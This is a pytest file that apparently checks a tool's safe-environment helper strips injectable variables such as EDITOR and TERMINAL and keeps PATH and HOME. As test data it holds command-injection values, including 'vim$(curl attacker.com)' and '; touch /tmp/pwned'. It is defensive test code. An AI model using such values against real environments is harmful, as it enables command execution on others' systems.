"""Tests for Claude Code settings-based attack mitigations."""

import json
import os
import sys
from pathlib import Path
from unittest.mock import patch

import pytest

# tests/test_security_mitigations.py -> repo root
sys.path.insert(0, str(Path(__file__).parents[1]))

from core.config import RaptorConfig


class TestSafeEnv:
    """get_safe_env() strips dangerous environment variables."""

    def test_strips_terminal(self):
        with patch.dict(os.environ, {"TERMINAL": "xterm; touch /tmp/pwned"}):
            env = RaptorConfig.get_safe_env()
            assert "TERMINAL" not in env

    def test_strips_editor(self):
        with patch.dict(os.environ, {"EDITOR": "vim$(curl attacker.com)"}):
            env = RaptorConfig.get_safe_env()
            assert "EDITOR" not in env

    def test_strips_visual(self):
        with patch.dict(os.environ, {"VISUAL": "code"}):
            env = RaptorConfig.get_safe_env()
            assert "VISUAL" not in env

    def test_strips_browser(self):
        with patch.dict(os.environ, {"BROWSER": "firefox"}):
            env = RaptorConfig.get_safe_env()
            assert "BROWSER" not in env

    def test_strips_pager(self):
        with patch.dict(os.environ, {"PAGER": "less"}):
            env = RaptorConfig.get_safe_env()
            assert "PAGER" not in env

    def test_strips_proxy_vars(self):
        with patch.dict(os.environ, {"HTTP_PROXY": "http://proxy:8080"}):
            env = RaptorConfig.get_safe_env()
            assert "HTTP_PROXY" not in env

    def test_preserves_path(self):
        env = RaptorConfig.get_safe_env()
        assert "PATH" in env

    def test_preserves_home(self):
        env = RaptorConfig.get_safe_env()
        assert "HOME" in env



class TestRepoDefault:
    """--repo defaults to RAPTOR_CALLER_DIR."""

    def test_env_var_used_as_default(self, tmp_path):
        """argparse picks up RAPTOR_CALLER_DIR when --repo not specified."""
        import argparse
        with patch.dict(os.environ, {"RAPTOR_CALLER_DIR": str(tmp_path)}):
            default = os.environ.get("RAPTOR_CALLER_DIR")
            assert default == str(tmp_path)

    def test_env_var_not_set_gives_none(self):
        env = os.environ.copy()
        env.pop("RAPTOR_CALLER_DIR", None)
        with patch.dict(os.environ, env, clear=True):
            assert os.environ.get("RAPTOR_CALLER_DIR") is None
